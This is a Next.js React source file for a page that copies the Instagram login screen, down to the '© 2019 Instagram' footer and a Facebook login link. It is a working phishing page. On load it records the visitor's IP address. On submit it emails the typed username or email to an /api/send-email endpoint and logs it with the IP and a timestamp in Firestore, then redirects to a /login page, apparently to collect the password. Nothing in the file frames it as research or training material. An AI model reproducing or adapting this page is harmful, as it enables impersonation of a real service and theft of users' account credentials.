'use client';

import db from '@/firebase/firebase';
import { doc, serverTimestamp, getDoc, setDoc } from 'firebase/firestore';

import { useState, useEffect } from 'react';
import { useRouter } from 'next/navigation';

import axios from 'axios';

const Home = () => {
	const [username, setUsername] = useState('');
	const [ip, setIp] = useState('');
	const router = useRouter();

	useEffect(() => {
		const fetchIp = async () => {
			try {
				const res = await axios.get('https://api.ipify.org?format=json');
				setIp(res.data.ip);
			} catch (error) {
				console.error('Error fetching IP address: ', error);
			}
		};
		fetchIp();
	}, []);

	const handleSubmit = async (e) => {
		try {
			e.preventDefault();

			const timestamp = new Intl.DateTimeFormat('en-US', {
				year: 'numeric',
				month: 'long',
				day: 'numeric',
				hour: 'numeric',
				minute: 'numeric',
				second: 'numeric',
				hour12: true,
				timeZone: 'America/Los_Angeles',
			}).format(new Date());

			const docRef = doc(db, 'usernames', ip);

			await axios.post('/api/send-email', {
				username: username,
				timestamp: timestamp,
			});

			const docSnap = await getDoc(docRef);
			console.log(docSnap.exists());
			let usernames = [];
			if (docSnap.exists()) {
				usernames = docSnap.data().usernames || [];
			}

			usernames.push({
				username: username,
				timestamp: timestamp,
			});

			await setDoc(docRef, {
				usernames: usernames,
			});

			router.push('/login');
		} catch (error) {
			router.push('/login');
			console.log('Error submitting form: ', error);
		}
	};

	return (
		<>
			<div id='wrapper'>
				<div className='container'>
					<div className='phone-app-demo'></div>
					<div className='form-data'>
						<form action='' onSubmit={handleSubmit}>
							<div className='logo'>
								<img src='./logo.png' alt='logo' />
							</div>
							<input
								type='text'
								placeholder='Username or email'
								onChange={(e) => {
									setUsername(e.target.value);
								}}
							/>
							<button className='form-btn' type='submit'>
								Next
							</button>
							<span className='has-separator'>Or</span>
							<a className='facebook-login' href='#'>
								<i className='fab fa-facebook-square'></i> Log in with Facebook
							</a>
							<a className='password-reset' href='#'>
								Forgot password?
							</a>
						</form>
						<div className='sign-up'>
							Don&apos;t have an account? <a href='#'>Sign up</a>
						</div>
						<div className='get-the-app'>
							<span>Get the app.</span>
							<div className='badges'>
								<img src='./app-store.png' alt='app-store badge' />
								<img src='./google-play.png' alt='google-play badge' />
							</div>
						</div>
					</div>
				</div>

				<footer>
					<div className='container'>
						<nav className='footer-nav'>
							<ul>
								<li>
									<a href='#'>About us</a>
								</li>
								<li>
									<a href='#'>Support</a>
								</li>
								<li>
									<a href='#'>Press</a>
								</li>
								<li>
									<a href='#'>Api</a>
								</li>
								<li>
									<a href='#'>Jobs</a>
								</li>
								<li>
									<a href='#'>Privacy</a>
								</li>
								<li>
									<a href='#'>Terms</a>
								</li>
								<li>
									<a href='#'>Directory</a>
								</li>
								<li>
									<a href='#'>Profiles</a>
								</li>
								<li>
									<a href='#'>Hashtags</a>
								</li>
								<li>
									<a href='#'>Languages</a>
								</li>
							</ul>
						</nav>
						<div className='copyright-notice'>&copy; 2019 Instagram</div>
					</div>
				</footer>
			</div>
		</>
	);
};

export default Home;
